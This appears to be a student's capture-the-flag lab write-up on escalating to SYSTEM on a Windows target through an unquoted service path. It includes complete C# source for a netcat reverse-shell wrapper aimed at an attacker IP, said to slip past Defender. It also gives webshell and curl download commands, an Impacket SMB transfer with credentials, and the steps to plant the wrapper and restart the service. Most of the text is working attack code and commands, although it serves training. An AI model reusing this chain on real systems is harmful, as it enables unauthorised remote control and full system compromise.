Let's recap what we found in the previous task:

- We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we'd need to obfuscate the exploits in order to get them past Defender.
- We have an *unquoted service path vulnerability* for a service running as the system account. This is ideal.

We have everything we need to root this box. Let's do this!

Of the two vulnerabilities that are immediately available, we will work through the *unquoted service path attack* for one simple reason: getting a reverse shell back from this is _very_ easy -- even with Defender in play. 

The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. 

Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, *in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system*. In this scenario we would be looking for a more sophisticated (if similar) solution.

Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the `mono` dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.

---
## Install mono

First we need to install Mono. This can be done with:  

```
sudo apt update
sudo apt install mono-devel -y
```


If you are using the AttackBox then this should already be installed.  

## Create Wrapper.cs

Now, open a file called `Wrapper.cs` in your favorite text editor.

The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:  

```
using System;
using System.Diagnostics;  
```
 

These allow us to start new processes (i.e. execute netcat).

Next we need to initialise a namespace and class for the program:  

```
namespace Wrapper{       
	class Program{           
		static void Main(){
			//Our code will go here!
		}
	}
}
```

We can now write the code that will call netcat. This goes inside the `Main()` function (replacing the `//Our code will go here!` line).

First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:  

```
Process proc = new Process();   
ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");
```

_Make sure to replace the_ `nc-USERNAME.exe` _with the name of your own netcat executable, as well as slotting in your own IP and Port!_

With the objects created, we can now configure the process to not create it's own GUI Window when starting:  
`procInfo.CreateNoWindow = true;`  

Finally, we attach the `ProcessStartInfo` object to the process, and start the process!  
`proc.StartInfo = procInfo;   proc.Start();`  

Our program is now complete. It should look something like this:

![[1680d2c86ef0.png]]

> [!Note]
> Use the following code if you have any trouble compiling the earlier code.
```
using System;
using System.Diagnostics;  

namespace Wrapper{       
	class Program{           
		static void Main(){
			
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\tasks\\nc-KAIROS.exe", "10.50.85.33 443 -e cmd.exe");
			Process proc = new Process { StartInfo = procInfo };
			proc.Start();
						
		}
	}
}
```

## Compile

We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:

```
mcs Wrapper.cs
```

![[f051e39d81f6.png]]

Write and compile a wrapper program using Mono or Visual Studio.

## Transfer Wrapper.exe

Transfer the `Wrapper.exe`   file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.


---

### HTTP Sever

`http://10.200.84.100/resources/uploads/shell-KAIROS.jpeg.php?wreath=curl%20http://10.50.85.33/Wrapper.exe%20-o%20C:\\Windows\\Tasks\\Wrapper_KAIROS.exe`


### cURL

#Attacking_Machine 
Open a HTTP Server
`sudo python3 -m http.server 80`

#Webshell 
Download Wrapper.exe file.

`curl http://10.50.85.33/Wrapper.exe -o C:\\Windows\\Tasks\\Wrapper.exe`


## Impacket

Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.  

First up, let's download the package:  
`sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .   `

> [!Note]
>On the AttackBox Impacket is preinstalled at `/opt/impacket/impacket`

#Attacking_Machine 
We can now start up a temporary SMB server:  

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword`

![[99f9b77f1bf0.png]]

With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.

#Reverse_Shell
Use this command to authenticate: 

`net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`

![[9a27791867af.png]]

This authenticates with the server using the credentials we set (`user:s3cureP@ssword`). We can now copy our compiled  `Wrapper.exe` program up to the target. Due to file permissions on the normal `C:\Windows\Temp` directory, we are doing this from our current user's own `%TEMP%` directory:  

#Reverse_Shell 
`copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe`

![[857c1d682e0e.png]]

> [!Note]
>We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway.

It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.

That said, to prevent errors down the line, we should disconnect from it for the time being: 

#Reverse_Shell 
`net use \\ATTACKER_IP\share /del`

![[060e1ee4ce7c.png]]

#Reverse_Shell 
Start a listener on your chosen port and try to execute the wrapper manually -- you should get a reverse shell back: 

`"%TEMP%\wrapper-USERNAME.exe"`

![[ff8bafc56cb6.png]]


## Unquoted service path vulnerability

Excellent. Our program works and is not getting caught by the antivirus. We are now ready to exploit that unquoted service path vulnerability!

Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes (e.g. `C:\Directory One\Directory Two\Executable.exe` ) then Windows will look for the executable in the following order:

1. `C:\Directory.exe`
2. `C:\Directory One\Directory.exe`
3. `C:\Directory One\Directory Two\Executable.exe   `

What this means is that if we can create a file called `Directory.exe` in the root directory, or `C:\Directory One\`, then we can trick Windows into executing our file instead!

Let's take a look at the actual path of our vulnerable service: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. There are technically three places we _could_ add our program here:

- We could put it in the root directory and call it `Program.exe`. This is _very_ unlikely to work, as the chances of having write permissions here are virtually 0.
- We could put it in the `C:\Program Files (x86)\` directory and call it `System.exe`. Once again, this is unlikely to work because the chances of being able to write into `C:\Program Files (x86)\` are minimal.
- We could put it in `C:\Program Files (x86)\System Explorer\` and call it `System.exe`. This one will work! Remember we checked the permissions of this directory in the last task and found that we had full access? This means that we can place our wrapper into this directory, then when the service is restarted, our wrapper will be executed giving us a shell as the local system user!

Before blindly copying your wrapper, check to make sure that another user isn't currently performing this exploit:  
`dir "C:\Program Files (x86)\System Explorer\"`  

If you see a file called `System.exe` in the output then _please wait a few minutes until it disappears._

If there is not already an exploit in the directory then it's time to root this thing!

Copy your wrapper from `C:\Windows\Temp\wrapper-USERNAME.exe` to `C:\Program Files (x86)\System Explorer\System.exe` .  
`copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"`

![[7faedc9a86ab.png]]

> [!Notice]
>There is a cleanup script running on this target once every five minutes in case any hackers are too sloppy to cover up their tracks by restoring the service to working order. If your payload disappears before execution then you may have been caught by the script. If this happens, just repeat this step and the exploit should work.

## Activate the exploit

Our exploit is in place! We have two options to activate it:

- This service starts automatically at boot, so we could try restarting the entire box (although we don't actually have the required permissions to do this to prevent users from taking the box down).
- We could try restarting the service itself. Given the amount of access to this service that Thomas has given to his account, it's a fair bet that we might be able to do this.

Failing either of these, we would be stuck waiting for someone to restart the target for us naturally.

### Stopping the Service

Let's try stopping the service:  
`sc stop SystemExplorerHelpService`

![[adffd8978a57.png]]

### Starting the Service

We can stop the service, so chances are we can also start it! Set up a listener on your attacking machine then start the service:  
`sc start SystemExplorerHelpService`

![[210940d0f105.png]]

> [!Success]
>We have root!

Notice that we got a message telling us that the service failed to start. This is because the wrapper we uploaded isn't actually a real Windows service file. Our executable still gets executed, but as far as Windows is concerned, the service failed to start.